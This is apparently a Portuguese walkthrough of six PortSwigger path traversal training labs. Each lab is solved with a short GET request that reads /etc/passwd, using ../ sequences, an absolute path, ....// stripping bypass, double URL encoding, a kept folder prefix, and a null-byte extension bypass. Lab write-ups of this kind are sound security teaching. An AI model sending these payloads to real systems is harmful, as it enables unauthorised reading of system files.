---
title: "PortSwigger - Path Traversal"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de Path Traversal da PortSwigger"
keywords: ["PortSwigger", "Path Traversal", "Directory Traversal", "File Disclosure", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: File path traversal, simple case
"This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file."

Com a interceptação das requisições pelo Burp proxy, observamos que cada imagem possui uma requisição para recuperar seu conteúdo. 
Injetando um o seguinte payload de path traversal na requisição, finalizamos o desafio.
```
GET /image?filename=../../../etc/passwd
```

## Lab: File path traversal, traversal sequences blocked with absolute path bypass
"This lab contains a path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the `/etc/passwd` file."

Mesmo processo do lab anterior, mas com a requisição:
```
GET /image?filename=/etc/passwd
```

## Lab: File path traversal, traversal sequences stripped non-recursively
"This lab contains a path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. "

Mesmo processo do lab "File path traversal, simple case", mas com a requisição:
```
GET /image?filename=....//....//....//etc/passwd
```

## Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
"This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. "

Mesmo processo do lab "File path traversal, simple case". Mas a requisição será `../../../etc/passwd` URL encoded 2 vezes.

## Lab: File path traversal, validation of start of path
"This lab contains a path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the `/etc/passwd` file."

Mesmo processo do lab "File path traversal, simple case". Nesse caso a requisição é:
```
GET /image?filename=/var/www/images/27.jpg 
```
Assim, basta editar mantendo o começo do caminho. 
```
GET /image?filename=/var/www/images/../../../etc/passwd 
```

## Lab: File path traversal, validation of file extension with null byte bypass
"This lab contains a path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the /etc/passwd file."

Mesmo processo do lab "File path traversal, simple case". Porém, como espera-se uma extensão de arquivo, inserimos um null byte no final do texto.

```
GET /image?filename=../../../etc/passwd%00.jpg
```
